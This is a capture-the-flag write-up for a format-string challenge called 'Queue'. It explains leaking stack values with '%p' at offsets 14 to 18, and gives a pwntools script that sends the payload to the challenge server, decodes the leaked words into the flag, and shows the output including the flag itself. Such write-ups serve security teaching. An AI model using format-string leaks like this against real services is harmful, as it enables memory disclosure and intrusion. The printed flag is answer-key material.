# Queue
`Address Leaking` `Format String`
<br>
<br>

This challenge is pretty straight forward, we can use `"%p"` to leak the value of the stack, but in order to find the real one we need to some someking of bruteforcing. After spamming `%p`, I found the start index, it was 14 and the last index is 16.

You can actually just leak it without the script I provide below and then proceed to decode it in cyberchef.

```python
from pwn import *
from binascii import unhexlify

p = remote('challs.actf.co',31322)

p.recvuntil(b'today? ')
p.sendline(b'%14$p %15$p %16$p %17$p %18$p')
p.recvuntil(b'nice, ')

a = p.recvuntil(b'\n').strip().replace(b'0x',b'').split(b' ')
print(a)

flag = b"".join(
    [
	unhexlify(a[0])[::-1],
	unhexlify(a[1])[::-1],
	unhexlify(a[2])[::-1],
	unhexlify(a[3])[::-1],
	unhexlify(a[4])[::-1],
]).decode()

print(flag)
```

If you're using this script, the output will look like this.

```
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kiinzu/.cache/.pwntools-cache-3.11/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.9.0)
[+] Opening connection to challs.actf.co on port 31322: Done
[b'3474737b66746361', b'75715f74695f6b63', b'615f74695f657565', b'3437396461393136', b'7d32326234363863']
actf{st4ck_it_queue_it_a619ad974c864b22}
[*] Closed connection to challs.actf.co port 31322
```